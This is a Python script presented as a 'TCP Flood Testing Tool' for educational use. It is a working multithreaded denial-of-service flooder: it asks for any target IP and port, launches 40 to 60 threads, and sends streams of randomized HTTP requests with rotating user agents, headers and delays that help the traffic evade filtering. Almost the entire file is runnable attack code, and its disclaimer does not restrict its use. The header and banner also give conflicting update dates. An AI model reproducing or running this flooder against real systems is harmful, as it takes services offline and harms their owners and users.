import threading
import socket
import time
import random
from datetime import datetime

"""
TCP Flood Testing Tool
Version: 1.0.1
Author: Ahmed Yasser Lotfy
Last Updated: 28/1/25

For educational purposes only. Use only on systems you own or have permission to test.
"""

# Basic configuration settings
target_ip = "192.168.1.1"
port = 80
already_connected = 0
attack_running = True

# List of common user agents for randomization
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Android 12; Mobile) AppleWebKit/537.36"
]

# List of common HTTP headers
COMMON_HEADERS = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language: en-US,en;q=0.5",
    "Accept-Encoding: gzip, deflate",
    "DNT: 1",
    "Connection: keep-alive",
    "Upgrade-Insecure-Requests: 1",
    "Cache-Control: max-age=0"
]

def show_status():
    """Function to display real-time status updates with enhanced information"""
    global already_connected
    start_time = time.time()
    
    while attack_running:
        elapsed_time = int(time.time() - start_time)
        rate = already_connected / elapsed_time if elapsed_time > 0 else 0
        print(f"[{datetime.now().strftime('%H:%M:%S')}] "
              f"Connections: {already_connected} | "
              f"Time: {elapsed_time}s | "
              f"Rate: {rate:.2f} req/s", end='\r')
        time.sleep(1)

def generate_http_request(target_ip):
    """Generate a randomized HTTP request"""
    paths = ["/", "/index.html", "/api/v1/status", "/health", "/info"]
    params = [
        f"id={random.randint(1, 1000)}",
        f"t={int(time.time())}",
        f"r={random.random()}",
        f"session={random.randint(10000, 99999)}"
    ]
    
    selected_headers = random.sample(COMMON_HEADERS, k=random.randint(3, len(COMMON_HEADERS)))
    
    request = (
        f"GET {random.choice(paths)}?{'&'.join(random.sample(params, k=2))} HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
    )
    
    for header in selected_headers:
        request += f"{header}\r\n"
    
    request += "\r\n"
    return request

def attack():
    """Main attack function with improved error handling and randomization"""
    global already_connected, attack_running
    
    while attack_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            timeout = random.uniform(0.8, 2.0)
            s.settimeout(timeout)
            
            print(f"\n[*] Attempting connection to {target_ip}:{port}")
            s.connect((target_ip, port))
            print(f"[+] Connected to {target_ip}:{port}")
            
            request_count = random.randint(8, 12)
            for _ in range(request_count):
                http_request = generate_http_request(target_ip)
                s.send(http_request.encode())
                already_connected += 1
                
                # Random delay between requests
                time.sleep(random.uniform(0.1, 0.3))
            
            s.close()
            
        except ConnectionRefusedError:
            print(f"\n[!] Connection refused - Target {target_ip} might be down or blocking connections")
            time.sleep(random.uniform(1, 2))
        except socket.timeout:
            print(f"\n[!] Connection timed out after {timeout:.1f}s - Network might be congested")
            time.sleep(random.uniform(1, 2))
        except socket.error as e:
            print(f"\n[!] Socket error: {str(e)}")
            time.sleep(random.uniform(1, 2))
        except Exception as e:
            print(f"\n[!] Unexpected error: {str(e)}")
            time.sleep(random.uniform(1, 2))

def start_attack():
    """Initialize and coordinate the attack with improved thread management"""
    global attack_running
    
    print("\n" + "="*60)
    print(f"Starting TCP flood test on {target_ip}:{port}")
    print("Press Ctrl+C to stop")
    print("="*60 + "\n")
    
    # Test initial connection
    try:
        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_socket.settimeout(2)
        test_socket.connect((target_ip, port))
        test_socket.close()
        print(f"[+] Target {target_ip}:{port} is reachable")
    except Exception as e:
        print(f"[!] Cannot reach target {target_ip}:{port}")
        print(f"[!] Error: {e}")
        return
    
    # Start status monitoring thread
    status_thread = threading.Thread(target=show_status)
    status_thread.daemon = True
    status_thread.start()
    
    # Create and start attack threads
    thread_count = random.randint(40, 60)  # Randomize thread count
    threads = []
    
    print(f"[*] Creating {thread_count} threads...")
    for i in range(thread_count):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        threads.append(thread)
        thread.start()
        print(f"[+] Thread {i+1}/{thread_count} started")
        time.sleep(random.uniform(0.1, 0.2))
    
    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n\n[+] Stopping attack...")
        attack_running = False
        time.sleep(1)
        print("[+] Attack stopped")
        print(f"[+] Total successful connections: {already_connected}")

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════╗
    ║           TCP Flood Testing Tool              ║
    ║        For Educational Purposes Only          ║
    ║                                              ║
    ║  Version: 1.0.1                              ║
    ║  Author: Ahmed Yasser Lotfy                  ║
    ║  Last Updated: 28/11/25                      ║
    ║                                              ║
    ║  Only use on systems you own or have         ║
    ║  explicit permission to test.                ║
    ╚══════════════════════════════════════════════╝
    """)
    
    # Get target information from user
    user_ip = input("Enter target IP (or press Enter for default 192.168.1.1): ").strip()
    if user_ip:
        target_ip = user_ip
    
    user_port = input("Enter target port (or press Enter for default 80): ").strip()
    if user_port:
        try:
            port = int(user_port)
            if port < 1 or port > 65535:
                print("[!] Invalid port number. Using default port 80")
                port = 80
        except ValueError:
            print("[!] Invalid port number. Using default port 80")
            port = 80
    
    start = input("\nPress Enter to start or Ctrl+C to exit...")
    start_attack()
